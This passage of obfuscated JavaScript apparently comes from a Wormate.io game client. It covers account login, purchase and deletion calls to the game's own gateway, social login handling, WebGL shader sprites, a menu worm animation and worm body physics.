            } else {
              _0x3a8123(_0x5a4428);
            }
          });
        };
        _0x15fb34.prototype.Hl = function (_0xd7a49d, _0xc80ccd, _0x1bd552, _0x4445ef) {
          var _0x5aee7a = _0x2c22d1.a.b + "/pub/wuid/" + this.Qk + "/buyProperty?id=" + _0xd7a49d + "&type=" + _0xc80ccd;
          _0x2c22d1.Z(_0x5aee7a, function () {
            _0x1bd552();
          }, function (_0x2615b5) {
            if (_0x2615b5.code !== 1200) {
              _0x1bd552();
            } else {
              _0x4445ef(_0x2615b5);
            }
          });
        };
        _0x15fb34.prototype.Il = function (_0x2b7e65, _0x471116) {
          var _0x3aa89b = _0x2c22d1.a.b + "/pub/wuid/" + this.Qk + "/deleteAccount";
          _0x2c22d1.Z(_0x3aa89b, _0x2b7e65, function (_0x538d71) {
            if (_0x538d71.code !== 1200) {
              _0x2b7e65();
            } else {
              _0x471116(_0x538d71);
            }
          });
        };
        _0x15fb34.prototype.Jl = function (_0x12ccc8) {
          var _0x2bfae8 = this;
          if (this.Pk) {
            this.Kl();
          }
          _0x15fb34.Sk.Xk(function () {
            _0x12ccc8();
          }, function (_0x2167a4) {
            _0x2bfae8.Ll("fb", _0x2167a4.Uk, _0x12ccc8);
          });
        };
        _0x15fb34.prototype.Ml = function (_0x313340) {
          var _0x2c81e7 = this;
          if (this.Pk) {
            this.Kl();
          }
          _0x15fb34.$k.Xk(function () {
            _0x313340();
          }, function (_0x2c93e2) {
            _0x2c81e7.Ll("gg", _0x2c93e2.Uk, _0x313340);
          });
        };
        _0x15fb34.prototype.Ll = function (_0x55c3ba, _0x2b922c, _0x1255e8, _0x27b3fc) {
          _0x27b3fc = _0x27b3fc || 0;
          var _0x30c7f1 = $("#please-wait-view");
          if (_0x27b3fc < 1) {
            _0x30c7f1.append(" AUTO CONNECTION <i id=\"auto_connection_text\">" + _0x27b3fc + "<i>...");
          }
          var _0x105146 = this;
          var _0x46fe9c = _0x55c3ba + "_" + _0x2b922c;
          var _0xbbb064 = "https://gateway.wormate.io/pub/wuid/" + _0x46fe9c + "/login";
          vps.wuid = _0x46fe9c;
          _0x27b3fc++;
          _0x30c7f1.fadeIn(500);
          $("#auto_connection_text").html(_0x27b3fc);
          fetch(_0xbbb064, {
            mode: "cors"
          }).then(function (_0x50e675) {
            if (_0x50e675.ok) {
              return _0x50e675.json();
            } else {
              throw new Error("Request error");
            }
          }).then(function (_0x1c8c0e) {
            if (_0x1c8c0e.code !== 1200) {
              _0x105146.Ll(_0x55c3ba, _0x2b922c, _0x1255e8, _0x27b3fc);
              return;
            }
            if (_0x1c8c0e.user_data) {
              _0x30c7f1.html("...");
              _0x30c7f1.fadeOut(500);
              _0x105146.Ol(_0x55c3ba, _0x2b922c, _0x1c8c0e.user_data);
              if (_0x1255e8 != null) {
                _0x1255e8();
              }
            }
          }).catch(function (_0x281bc2) {
            _0x105146.Nl();
            _0x30c7f1.html("...");
            _0x30c7f1.fadeOut(500);
          });
        };
        _0x15fb34.prototype.Kl = function () {
          try {
            this.Pl();
            this.Ql();
          } catch (_0x4636f1) {}
          this.Rl();
        };
        _0x15fb34.prototype.Sl = function () {
          if (this.Pk) {
            this.Il(function () {}, function (_0x166eef) {});
          }
        };
        _0x15fb34.prototype.Nl = function () {
          _0xe610a0().og.Ak(_0xe610a0().og.tk);
        };
        _0x15fb34.prototype.Ol = function (_0x1cf099, _0x5247ea, _0x101da3) {
          var _0xeb1b4 = this;
          var _0x2e2ca0 = this.Pk ? this.Rk.userId : "guest";
          _0x10dd7d(_0x101da3, function (_0x4f59bb) {
            _0x52c55d(_0x4f59bb);
            _0xeb1b4.Pk = true;
            _0xeb1b4.Qk = _0x1cf099 + "_" + _0x5247ea;
            _0xeb1b4.Rk = _0x4f59bb;
            vps.wuid = _0xeb1b4.Qk;
            _0x31b4a1.Vf.eg(_0x31b4a1.Vf.$f, _0x1cf099, 60);
            if (_0x2e2ca0 !== _0xeb1b4.Rk.userId) {
              _0xeb1b4.Tl();
            } else {
              _0xeb1b4.Dl();
            }
            window.vps.loading = false;
          });
        };
        _0x15fb34.prototype.Rl = function () {
          var _0x436458 = this.Pk ? this.Rk.userId : "guest";
          this.Pk = false;
          this.Qk = _0x5d0fb8;
          this.Rk = {};
          _0x31b4a1.Vf.eg(_0x31b4a1.Vf.$f, "", 60);
          if (_0x436458 !== this.Rk.userId) {
            this.Tl();
          } else {
            this.Dl();
          }
        };
        _0x15fb34.prototype.bl = function () {
          var _0x1754a4 = _0x31b4a1.Vf.fg(_0x31b4a1.Vf.$f);
          var _0x26286f = this;
          if (_0x1754a4 === "fb") {
            var _0x3cacff = 1;
            (function _0x2a6954() {
              if (!_0x15fb34.Sk.Vk() && _0x3cacff++ < 5) {
                setTimeout(_0x2a6954, 1000);
                return;
              }
              _0x15fb34.Sk.Yk(function () {}, function (_0x3b2157) {
                _0x26286f.Ll("fb", _0x3b2157.Uk);
              });
            })();
          } else if (_0x1754a4 === "gg") {
            var _0x4b7d10 = 1;
            (function _0x38f1b7() {
              if (!_0x15fb34.$k.Vk() && _0x4b7d10++ < 5) {
                setTimeout(_0x38f1b7, 1000);
                return;
              }
              _0x15fb34.$k.Yk(function () {}, function (_0x33a8e2) {
                _0x26286f.Ll("gg", _0x33a8e2.Uk);
              });
            })();
          }
        };
        _0x15fb34.prototype.Tl = function () {
          for (var _0x155601 = 0; _0x155601 < this.Nk.length; _0x155601++) {
            this.Nk[_0x155601]();
          }
          this.Dl();
        };
        _0x15fb34.prototype.Dl = function () {
          for (var _0x12e521 = 0; _0x12e521 < this.Ok.length; _0x12e521++) {
            this.Ok[_0x12e521]();
          }
        };
        _0x15fb34.prototype.Pl = function () {
          _0x15fb34.Sk.Zk();
        };
        _0x15fb34.prototype.Ql = function () {
          _0x15fb34.$k.Zk();
        };
        return _0x15fb34;
      }();
      _0x31b4a1.if = function () {
        function _0x2fa5fc(_0x1c708d, _0xe3b9a7, _0x49bebd) {
          this.ef = _0x49bebd;
          this.hd = false;
          this.nc = new _0x131478.Container();
          this.nc.visible = false;
          this.Ul = new Array(_0x1c708d);
          for (var _0x129df3 = 0; _0x129df3 < this.Ul.length; _0x129df3++) {
            var _0x4a1ac8 = new _0x31b4a1.Vl(new Float32Array(_0xe3b9a7 * 3));
            _0x4a1ac8.Wl(_0xe3b9a7);
            this.Ul[_0x129df3] = _0x4a1ac8;
            this.nc.addChild(_0x4a1ac8.tf());
          }
          this.ff = 1;
          this.gf = 1;
          this.Jf();
        }
        _0x2fa5fc.prototype.tf = function () {
          return this.nc;
        };
        _0x2fa5fc.prototype.Kf = function (_0x276d24) {
          this.hd = _0x276d24;
          this.nc.visible = _0x276d24;
        };
        _0x2fa5fc.prototype.Jf = function () {
          this.ff = this.ef.width();
          this.gf = this.ef.height();
          var _0x4c49ac = this.gf / 30;
          for (var _0x514c1e = 0; _0x514c1e < this.Ul.length; _0x514c1e++) {
            this.Ul[_0x514c1e].Xl(_0x4c49ac);
          }
        };
        _0x2fa5fc.prototype.Uf = function () {
          if (this.hd) {
            for (var _0x56aed4 = 0; _0x56aed4 < this.Ul.length; _0x56aed4++) {
              this.Ul[_0x56aed4].Uf(this.lf);
            }
          }
        };
        _0x2fa5fc.prototype.Yl = function () {
          return this.ff;
        };
        _0x2fa5fc.prototype.Zl = function () {
          return this.gf;
        };
        _0x2fa5fc.prototype.Qf = function (_0x4772b5, _0x2b062e) {
          this.Ul[_0x4772b5].$l(_0x2b062e);
        };
        _0x2fa5fc.prototype.Rf = function (_0x47fade, _0x1f1bc0) {
          this.Ul[_0x47fade]._l(_0x1f1bc0);
        };
        _0x2fa5fc.prototype.Sf = function (_0x5b4176, _0x3b1000, _0x2c73d2) {
          var _0x5aea32 = this.Ul[_0x5b4176];
          for (var _0x46f287 = _0x5aea32.am(), _0x3bd828 = _0x5aea32.bm, _0x113c41 = 0; _0x113c41 < _0x46f287; _0x113c41++) {
            _0x3bd828[_0x113c41 * 3] = _0x3b1000;
            _0x3bd828[_0x113c41 * 3 + 1] = _0x2c73d2;
            _0x3bd828[_0x113c41 * 3 + 2] = 0;
          }
        };
        _0x2fa5fc.prototype.Tf = function (_0x50785c, _0x427671, _0x761082) {
          var _0x221c3c = this.Ul[_0x50785c];
          var _0x3f7df3 = _0x221c3c.am();
          var _0x3582e7 = _0x221c3c.bm;
          var _0x4c565e = _0x221c3c.cm();
          var _0x36e487 = _0x3582e7[0];
          var _0x16f584 = undefined;
          var _0x2e3789 = _0x3582e7[1];
          var _0x3b798b = undefined;
          var _0x31f85d = _0x427671 - _0x36e487;
          var _0x161dec = _0x761082 - _0x2e3789;
          var _0x135e45 = Math.hypot(_0x31f85d, _0x161dec);
          if (_0x135e45 > 0) {
            _0x3582e7[0] = _0x427671;
            _0x3582e7[1] = _0x761082;
            _0x3582e7[2] = Math.atan2(_0x161dec, _0x31f85d);
            var _0x144f19 = _0x4c565e * 0.25 / (_0x4c565e * 0.25 + _0x135e45);
            var _0x4de526 = 1 - _0x144f19 * 2;
            for (var _0x544797 = 1, _0x41509f = _0x3f7df3; _0x544797 < _0x41509f; _0x544797++) {
              _0x16f584 = _0x3582e7[_0x544797 * 3];
              _0x3582e7[_0x544797 * 3] = _0x3582e7[_0x544797 * 3 - 3] * _0x4de526 + (_0x16f584 + _0x36e487) * _0x144f19;
              _0x36e487 = _0x16f584;
              _0x3b798b = _0x3582e7[_0x544797 * 3 + 1];
              _0x3582e7[_0x544797 * 3 + 1] = _0x3582e7[_0x544797 * 3 - 2] * _0x4de526 + (_0x3b798b + _0x2e3789) * _0x144f19;
              _0x2e3789 = _0x3b798b;
              _0x3582e7[_0x544797 * 3 + 2] = Math.atan2(_0x3582e7[_0x544797 * 3 - 2] - _0x3582e7[_0x544797 * 3 + 1], _0x3582e7[_0x544797 * 3 - 3] - _0x3582e7[_0x544797 * 3]);
            }
          }
        };
        return _0x2fa5fc;
      }();
      _0x31b4a1.dm = function () {
        function _0x90caa6(_0x4fa967) {
          var _0x3f9c2d = this;
          this.ef = _0x4fa967;
          this.Eb = _0x4fa967.get()[0];
          this.lf = new _0x131478.Renderer({
            view: _0x4fa967.get()[0],
            transparent: true,
            antialias: false
          });
          this.hd = false;
          this.em = new _0x31b4a1.Vl(new Float32Array(_0x3e21c6 * 3));
          this.ff = 1;
          this.gf = 1;
          this.fm = _0x310e27.gm;
          this.hm = _0x310e27.gm;
          this.im = _0x310e27.gm;
          this.jm = _0x310e27.gm;
          this.km = _0x310e27.gm;
          this.Jf();
          _0xe610a0().Lc.$b(function () {
            _0x3f9c2d.em.lm();
          });
        }
        var _0x3e21c6 = Math.min(100, _0x31b4a1.WormSpriteTree.wc);
        var _0x310e27 = {
          gm: "0lt0",
          mm: "0lt1",
          nm: "0lt2"
        };
        _0x90caa6.prototype.Kf = function (_0x367c63) {
          this.hd = _0x367c63;
        };
        _0x90caa6.prototype.Jf = function () {
          var _0x213cdc = window.devicePixelRatio ? window.devicePixelRatio : 1;
          this.ff = this.ef.width();
          this.gf = this.ef.height();
          this.lf.resize(this.ff, this.gf);
          this.lf.resolution = _0x213cdc;
          this.Eb.width = _0x213cdc * this.ff;
          this.Eb.height = _0x213cdc * this.gf;
          var _0x5401e2 = this.gf / 4;
          this.em.Xl(_0x5401e2);
          var _0x22d709 = _0x2c22d1.P(Math.floor(this.ff / _0x5401e2) * 2 - 5, 1, _0x3e21c6);
          this.em.Wl(_0x22d709);
        };
        _0x90caa6.prototype.Nf = function () {
          if (this.hd) {
            var _0x1bfde6 = Date.now();
            var _0x4414b8 = _0x1bfde6 / 200;
            var _0x564ead = Math.sin(_0x4414b8);
            this.em.om(this.pm(this.fm, _0x564ead), this.qm(this.fm, _0x564ead));
            this.em.rm(this.sm(this.hm, _0x564ead), this.sm(this.im, _0x564ead), this.sm(this.jm, _0x564ead), this.sm(this.km, _0x564ead));
            var _0x1de525 = this.em.cm();
            for (var _0x2471c7 = this.em.am(), _0xac9ce8 = this.em.bm, _0x4154a5 = this.ff - (this.ff - _0x1de525 * 0.5 * (_0x2471c7 - 1)) * 0.5, _0x50706a = this.gf * 0.5, _0x2c2977 = 0, _0x52ae34 = 0, _0x49bbf8 = -1; _0x49bbf8 < _0x2471c7; _0x49bbf8++) {
              var _0x1cdc93 = _0x49bbf8;
              var _0x1df5fa = Math.cos(_0x1cdc93 * 1 / 12 * Math.PI - _0x4414b8) * (1 - Math.pow(16, _0x1cdc93 * -1 / 12));
              if (_0x49bbf8 >= 0) {
                _0xac9ce8[_0x49bbf8 * 3] = _0x4154a5 + _0x1de525 * -0.5 * _0x1cdc93;
                _0xac9ce8[_0x49bbf8 * 3 + 1] = _0x50706a + _0x1de525 * 0.5 * _0x1df5fa;
                _0xac9ce8[_0x49bbf8 * 3 + 2] = Math.atan2(_0x52ae34 - _0x1df5fa, _0x1cdc93 - _0x2c2977);
              }
              _0x2c2977 = _0x1cdc93;
              _0x52ae34 = _0x1df5fa;
            }
            this.em.Uf();
            this.em.tm(this.lf);
          }
        };
        _0x90caa6.prototype.$l = function (_0x5e77d9) {
          this.em.$l(_0x5e77d9);
        };
        _0x90caa6.prototype.um = function (_0x10c4ec) {
          this.fm = _0x10c4ec ? _0x310e27.nm : _0x310e27.mm;
          this.hm = _0x310e27.gm;
          this.im = _0x310e27.gm;
          this.jm = _0x310e27.gm;
          this.km = _0x310e27.gm;
        };
        _0x90caa6.prototype.vm = function (_0x2cf755) {
          this.fm = _0x310e27.gm;
          this.hm = _0x2cf755 ? _0x310e27.nm : _0x310e27.mm;
          this.im = _0x310e27.gm;
          this.jm = _0x310e27.gm;
          this.km = _0x310e27.gm;
        };
        _0x90caa6.prototype.wm = function (_0x4a59a8) {
          this.fm = _0x310e27.gm;
          this.hm = _0x310e27.gm;
          this.im = _0x4a59a8 ? _0x310e27.nm : _0x310e27.mm;
          this.jm = _0x310e27.gm;
          this.km = _0x310e27.gm;
        };
        _0x90caa6.prototype.xm = function (_0x2a35d7) {
          this.fm = _0x310e27.gm;
          this.hm = _0x310e27.gm;
          this.im = _0x310e27.gm;
          this.jm = _0x2a35d7 ? _0x310e27.nm : _0x310e27.mm;
          this.km = _0x310e27.gm;
        };
        _0x90caa6.prototype.ym = function (_0x2c9ee2) {
          this.fm = _0x310e27.gm;
          this.hm = _0x310e27.gm;
          this.im = _0x310e27.gm;
          this.jm = _0x310e27.gm;
          this.km = _0x2c9ee2 ? _0x310e27.nm : _0x310e27.mm;
        };
        _0x90caa6.prototype.pm = function (_0x4b3c2f, _0x10ac5c) {
          switch (_0x4b3c2f) {
            case _0x310e27.mm:
              return 0.9 + _0x10ac5c * 0.1;
            case _0x310e27.nm:
              return 0.4 + _0x10ac5c * 0.3;
          }
          return 1;
        };
        _0x90caa6.prototype.qm = function (_0x5f39ea, _0x152d86) {
          switch (_0x5f39ea) {
            case _0x310e27.mm:
              return 0.6 + _0x152d86 * 0.5;
            case _0x310e27.nm:
              return 0.3 + _0x152d86 * 0.3;
          }
          return 1;
        };
        _0x90caa6.prototype.sm = function (_0x275c8c, _0x3871ab) {
          switch (_0x275c8c) {
            case _0x310e27.mm:
              return 0.9 + _0x3871ab * 0.1;
            case _0x310e27.nm:
              return 0.6 + _0x3871ab * 0.4;
          }
          return 1;
        };
        return _0x90caa6;
      }();
      _0x31b4a1.Oj = function () {
        function _0x8e7fd6(_0x3074be, _0x2cc6e5, _0x4f1084, _0x217e56, _0x3cac1f) {
          this.zm = _0x3074be;
          this.Am = _0x2cc6e5;
          this.Bm = _0x4f1084;
          this.Cm = _0x217e56;
          this.Dm = _0x3cac1f;
        }
        _0x8e7fd6.Nj = function (_0x5ce530) {
          return new _0x8e7fd6(_0x5ce530.price, _0x5ce530.guest, _0x5ce530.nonbuyable, _0x5ce530.nonbuyableCause, _0x5ce530.description || _0x5ce530.refer?.texture || "🎨   " + _0x5ce530.id);
        };
        _0x8e7fd6.Pj = function (_0x15ddee) {
          return new _0x8e7fd6(_0x15ddee.price, _0x15ddee.guest, _0x15ddee.nonbuyable, _0x15ddee.nonbuyableCause, _0x15ddee.description);
        };
        _0x8e7fd6.prototype.Jj = function () {
          return this.zm;
        };
        _0x8e7fd6.prototype.Mj = function () {
          return this.Am;
        };
        _0x8e7fd6.prototype.Kj = function () {
          return this.Bm;
        };
        _0x8e7fd6.prototype.Em = function () {
          return this.Cm;
        };
        _0x8e7fd6.prototype.Fm = function () {
          return this.Dm;
        };
        return _0x8e7fd6;
      }();
      _0x31b4a1.qf = function () {
        function _0x5a64a9(_0xb52414) {
          this.Gm = {};
          this.Gm[_0x34c988] = _0xb52414;
          var _0x422dd5 = _0x131478.Shader.from(_0x51ecca, _0x4feb2e, this.Gm);
          this.sf = new _0x131478.Mesh(_0x3042fe, _0x422dd5);
          this.sf.blendMode = _0x131478.v.B;
        }
        var _0x231b7d = "a1_" + _0x2c22d1.X();
        var _0x2dbaf3 = "a2_" + _0x2c22d1.X();
        var _0x34c988 = "u3_" + _0x2c22d1.X();
        var _0xa8035b = "u4_" + _0x2c22d1.X();
        var _0x146d09 = "v1_" + _0x2c22d1.X();
        var _0x3042fe = new _0x131478.Geometry().addAttribute(_0x231b7d, [0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1], 2).addAttribute(_0x2dbaf3, [0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1], 2);
        var _0x51ecca = "precision mediump float;attribute vec2 " + _0x231b7d + ";attribute vec2 " + _0x2dbaf3 + ";uniform mat3 translationMatrix ;uniform mat3 projectionMatrix; uniform vec4 " + _0xa8035b + ";varying vec2 " + _0x146d09 + ";const float ROT_ANGLE_DEG=7.5;const float ROT_COS=cos(ROT_ANGLE_DEG/180.0*6.283185307179586);const float ROT_SIN=sin(ROT_ANGLE_DEG/180.0*6.283185307179586);void main(){gl_Position=vec4((projectionMatrix * translationMatrix * vec3(" + _0x231b7d + ",1.0)).xy,0.0,1.0);vec4 _ScreenParams=" + _0xa8035b + ";vec2 uv=" + _0x2dbaf3 + ";vec2 mul=0.5*vec2(_ScreenParams.x*(_ScreenParams.w-1.0)+1.0,_ScreenParams.y*(_ScreenParams.z-1.0)+1.0);vec2 v2=(uv-vec2(0.5,0.5))*mul*1.25;v2=vec2(v2.x*ROT_COS-v2.y*ROT_SIN,v2.x*ROT_SIN+v2.y*ROT_COS)*vec2(1,2);uv=v2;" + _0x146d09 + "=uv;}";
        var _0x4feb2e = "precision highp float;varying vec2 " + _0x146d09 + ";uniform sampler2D " + _0x34c988 + ";void main(){gl_FragColor=texture2D(" + _0x34c988 + "," + _0x146d09 + ");}";
        _0x5a64a9.prototype.Mf = function (_0xadc6d1, _0x3d2194) {
          this.sf.scale.x = _0xadc6d1;
          this.sf.scale.y = _0x3d2194;
          this.Gm[_0xa8035b] = [_0xadc6d1, _0x3d2194, 1 / _0xadc6d1 + 1, 1 / _0x3d2194 + 1];
        };
        return _0x5a64a9;
      }();
      _0x31b4a1.WMGBS1 = function () {
        function _0x5d3efb(_0x5516a4) {
          var _0x12beca = vps.bgGameWidth || 1;
          var _0x4a124f = vps.bgGameHeight || 1;
          var _0x27dba2 = 1100;
          var _0x2b66e2 = _0x12beca > 512 ? _0x12beca >= 1000 ? 1 : 0.1 : 0.01;
          this.Gm = {};
          this.Gm[_0x20952a] = [1, 0.5, 0.25, 0.5];
          this.Gm[_0x209532] = _0x131478.Texture.WHITE;
          this.Gm[_0x40d341] = [0, 0];
          this.Gm[_0x5d781f] = [0, 0];
          this.sf = new PIXI.TilingSprite(_0x5516a4 || _0x380234.xe._g, _0x2b66e2 == 1 ? _0x27dba2 : 120000, _0x2b66e2 == 1 ? _0x27dba2 : 120000);
          this.sf.scale.x = _0x2b66e2;
          this.sf.scale.y = _0x2b66e2;
          this.sf.position.x = -(_0x2b66e2 == 1 ? _0x12beca / 2 : 625);
          this.sf.position.y = -(_0x2b66e2 == 1 ? _0x4a124f / 2 : 625);
          console.log("WMGBS1", _0x12beca, _0x4a124f);
        }
        var _0x20952a = "u3_";
        var _0x209532 = "u4_";
        var _0x40d341 = "u5_";
        var _0x5d781f = "u6_";
        _0x5d3efb.prototype.Ec = function (_0xf7001a, _0x360428, _0x1bfad9, _0x559560) {
          var _0xabd5b1 = this.Gm[_0x20952a];
          _0xabd5b1[0] = _0xf7001a;
          _0xabd5b1[1] = _0x360428;
          _0xabd5b1[2] = _0x1bfad9;
          _0xabd5b1[3] = _0x559560;
        };
        _0x5d3efb.prototype.$g = function (_0x562021) {
          this.Gm[_0x209532] = _0x562021;
        };
        _0x5d3efb.prototype.Uf = function (_0x2e7e6a, _0x1e3f13, _0x582833, _0x593c38) {};
        return _0x5d3efb;
      }();
      _0x31b4a1.WMGBS2 = function () {
        function _0x4c58b1() {
          this.Gm = {};
          this.Gm[_0x1c6c0f] = [1, 0.5, 0.25, 0.5];
          this.Gm[_0x5b3bc3] = _0x131478.Texture.WHITE;
          this.Gm[_0xe37282] = [0, 0];
          this.Gm[_0x30206c] = [0, 0];
          var _0x38def2 = _0x131478.Shader.from(_0x19b0c4, _0x5525b6, this.Gm);
          this.sf = new _0x131478.Mesh(_0x1b41b7, _0x38def2);
        }
        var _0x4d944e = "a1_" + _0x2c22d1.X();
        var _0x34bfa8 = "a2_" + _0x2c22d1.X();
        var _0x288641 = "translationMatrix";
        var _0xfba9ef = "projectionMatrix";
        var _0x1c6c0f = "u3_" + _0x2c22d1.X();
        var _0x5b3bc3 = "u4_" + _0x2c22d1.X();
        var _0xe37282 = "u5_" + _0x2c22d1.X();
        var _0x30206c = "u6_" + _0x2c22d1.X();
        var _0x304204 = "v1_" + _0x2c22d1.X();
        var _0x1b41b7 = new _0x131478.Geometry().addAttribute(_0x4d944e, [-0.5, -0.5, 0.5, -0.5, 0.5, 0.5, -0.5, -0.5, 0.5, 0.5, -0.5, 0.5], 2).addAttribute(_0x34bfa8, [-0.5, -0.5, 0.5, -0.5, 0.5, 0.5, -0.5, -0.5, 0.5, 0.5, -0.5, 0.5], 2);
        var _0x19b0c4 = "precision mediump float;attribute vec2 " + _0x4d944e + ";attribute vec2 " + _0x34bfa8 + ";uniform mat3 " + _0x288641 + ";uniform mat3 " + _0xfba9ef + ";varying vec2 " + _0x304204 + ";void main(){" + _0x304204 + "=" + _0x34bfa8 + ";gl_Position=vec4((" + _0xfba9ef + "*" + _0x288641 + "*vec3(" + _0x4d944e + ",1.0)).xy,0.0,1.0);}";
        var _0x5525b6 = "precision highp float;varying vec2 " + _0x304204 + ";uniform vec4 " + _0x1c6c0f + ";uniform sampler2D " + _0x5b3bc3 + ";uniform vec2 " + _0xe37282 + ";uniform vec2 " + _0x30206c + ";void main(){vec2 coord=" + _0x304204 + "*" + _0xe37282 + "+" + _0x30206c + ";vec4 v_color_mix=" + _0x1c6c0f + ";gl_FragColor=texture2D(" + _0x5b3bc3 + ",coord)*0.3+v_color_mix.a*vec4(v_color_mix.rgb,0.0);}";
        _0x4c58b1.prototype.Ec = function (_0xb40806, _0x19caed, _0x55ee10, _0x5bee52) {
          var _0x59680f = this.Gm[_0x1c6c0f];
          _0x59680f[0] = _0xb40806;
          _0x59680f[1] = _0x19caed;
          _0x59680f[2] = _0x55ee10;
          _0x59680f[3] = _0x5bee52;
        };
        _0x4c58b1.prototype.$g = function (_0x5306f6) {
          this.Gm[_0x5b3bc3] = _0x5306f6;
        };
        _0x4c58b1.prototype.Uf = function (_0x473ef6, _0x3ce956, _0x5be0d1, _0x31fda2) {
          this.sf.position.x = _0x473ef6;
          this.sf.position.y = _0x3ce956;
          this.sf.scale.x = _0x5be0d1;
          this.sf.scale.y = _0x31fda2;
          var _0x5e4c62 = this.Gm[_0xe37282];
          _0x5e4c62[0] = _0x5be0d1 * 0.2520615384615385;
          _0x5e4c62[1] = _0x31fda2 * 0.4357063736263738;
          var _0x5c4966 = this.Gm[_0x30206c];
          _0x5c4966[0] = _0x473ef6 * 0.2520615384615385;
          _0x5c4966[1] = _0x3ce956 * 0.4357063736263738;
        };
        return _0x4c58b1;
      }();
      _0x31b4a1.sc = function () {
        function _0x481b92() {
          this.xc = new PIXI.Sprite();
          this.ev = null;
          this.Hm = 0;
          this.Im = 0;
          this.si = null;
        }
        _0x481b92.prototype.Bc = function (_0x574de2, _0x320b01, _0x2cb042) {
          if (_0x574de2) {
            this.xc.texture = _0x574de2.Ea();
            this.xc.anchor.set(_0x574de2.ya, _0x574de2.za);
            this.Hm = _0x574de2.Aa;
            this.Im = _0x574de2.Ba;
          } else {}
        };
        _0x481b92.prototype.Ec = function (_0x4c22c2) {
          this.xc.tint = parseInt(_0x4c22c2.substring(1), 16);
        };
        _0x481b92.prototype.Tc = function (_0x3f33ef) {
          try {
            this.xc.width = _0x3f33ef * this.Hm;
            this.xc.height = _0x3f33ef * this.Im;
          } catch (_0x5cdde5) {}
        };
        _0x481b92.prototype.md = function (_0x3140e2) {
          this.xc.rotation = _0x3140e2;
        };
        _0x481b92.prototype.ld = function (_0x49428b, _0x49b241) {
          this.xc.position.set(_0x49428b, _0x49b241);
        };
        _0x481b92.prototype.kd = function (_0x485774) {
          this.xc.visible = _0x485774;
        };
        _0x481b92.prototype.gd = function () {
          return this.xc.visible;
        };
        _0x481b92.prototype.jj = function (_0x545d3f) {
          this.xc.alpha = _0x545d3f;
        };
        _0x481b92.prototype.Qc = function () {
          return this.xc;
        };
        _0x481b92.prototype.Rc = function () {
          _0x2c22d1.U(this.xc);
        };
        return _0x481b92;
      }();
      _0x31b4a1.Worm = function () {
        function _0x4dc5ec(_0x38a5cf) {
          this.hh = _0x38a5cf;
          this.Eh = new _0x31b4a1.Worm.li();
          this.xi = false;
          this.wi = true;
          this.Xc = false;
          this.$c = 0;
          this.Jm = 0;
          this.dj = 1;
          this.bd = 0;
          this.Bh = 0;
          this.dd = {};
          this.ad = 0;
          this.Km = new Float32Array(_0x2e3560 * 2);
          this.Lm = new Float32Array(_0x2e3560 * 2);
          this._c = new Float32Array(_0x2e3560 * 2);
          this.Mm = null;
          this.Nm = null;
          this.Om = null;
          this.Pm();
        }
        var _0x2e3560 = 200;
        _0x4dc5ec.prototype.si = function () {
          if (this.Nm != null) {
            _0x2c22d1.U(this.Nm.nc);
          }
          if (this.Om != null) {
            _0x2c22d1.U(this.Om);
          }
        };
        _0x4dc5ec.prototype.Pm = function () {
          this.zi(0.25);
          this.Eh.ma = "";
          this.wi = true;
          this.dd = {};
          this.kd(false);
        };
        _0x4dc5ec.prototype.ri = function (_0x246e24) {
          this.Eh = _0x246e24;
          this.Qm(this.xi);
        };
        _0x4dc5ec.prototype.kd = function (_0x7928a7) {
          var _0x58f820 = this.xi;
          this.xi = _0x7928a7;
          this.Qm(_0x58f820);
        };
        _0x4dc5ec.prototype.zi = function (_0x2ba613) {
          this.Bh = _0x2ba613 * 50;
          var _0x3cd5cb = _0x2ba613;
          if (_0x2ba613 > this.hh.Ag) {
            _0x3cd5cb = Math.atan((_0x2ba613 - this.hh.Ag) / this.hh.Bg) * this.hh.Bg + this.hh.Ag;
          }
          var _0x516440 = Math.sqrt(Math.pow(_0x3cd5cb * 5, 0.707106781186548) * 4 + 25);
          var _0x2d774a = Math.min(_0x2e3560, Math.max(3, (_0x516440 - 5) * 5 + 1));
          var _0x2bf7ac = this.ad;
          this.$c = (5 + _0x516440 * 0.9) * 0.025;
          this.ad = Math.floor(_0x2d774a);
          this.Jm = _0x2d774a - this.ad;
          if (_0x2bf7ac > 0 && _0x2bf7ac < this.ad) {
            var _0xffa4a4 = this.Km[_0x2bf7ac * 2 - 2];
            var _0x4d527d = this.Km[_0x2bf7ac * 2 - 1];
            var _0x88bca2 = this.Lm[_0x2bf7ac * 2 - 2];
            var _0x3c7a65 = this.Lm[_0x2bf7ac * 2 - 1];
            var _0x4720e3 = this._c[_0x2bf7ac * 2 - 2];
            var _0x2b4af8 = this._c[_0x2bf7ac * 2 - 1];
            for (var _0x4d6bad = _0x2bf7ac; _0x4d6bad < this.ad; _0x4d6bad++) {
              this.Km[_0x4d6bad * 2] = _0xffa4a4;
              this.Km[_0x4d6bad * 2 + 1] = _0x4d527d;
              this.Lm[_0x4d6bad * 2] = _0x88bca2;
              this.Lm[_0x4d6bad * 2 + 1] = _0x3c7a65;
              this._c[_0x4d6bad * 2] = _0x4720e3;
              this._c[_0x4d6bad * 2 + 1] = _0x2b4af8;
            }
          }
        };
        _0x4dc5ec.prototype.Ei = function (_0x5e2f76, _0x5a2b78) {
          this.ad = _0x5a2b78;
          for (var _0x31d531 = 0; _0x31d531 < this.ad; _0x31d531++) {
            this.Km[_0x31d531 * 2] = this.Lm[_0x31d531 * 2] = this._c[_0x31d531 * 2] = _0x5e2f76();
            this.Km[_0x31d531 * 2 + 1] = this.Lm[_0x31d531 * 2 + 1] = this._c[_0x31d531 * 2 + 1] = _0x5e2f76();
          }
        };
        _0x4dc5ec.prototype.Bi = function (_0x262867, _0x65087a, _0x5028a1) {
          this.Xc = _0x5028a1;
          for (var _0x5a3dd9 = 0; _0x5a3dd9 < this.ad; _0x5a3dd9++) {
            this.Km[_0x5a3dd9 * 2] = this.Lm[_0x5a3dd9 * 2];
            this.Km[_0x5a3dd9 * 2 + 1] = this.Lm[_0x5a3dd9 * 2 + 1];
          }
          var _0x2dd987 = _0x262867 - this.Lm[0];
          var _0x36ddc3 = _0x65087a - this.Lm[1];
          this.Rm(_0x2dd987, _0x36ddc3, this.ad, this.Lm);
        };
        _0x4dc5ec.prototype.Rm = function (_0x54f697, _0x35d39a, _0x37ef2b, _0x6d41df) {
          var _0x2b5425 = Math.hypot(_0x54f697, _0x35d39a);
          if (!(_0x2b5425 <= 0)) {
            var _0x49906c = _0x6d41df[0];
            var _0x53bfa6 = undefined;
            _0x6d41df[0] += _0x54f697;
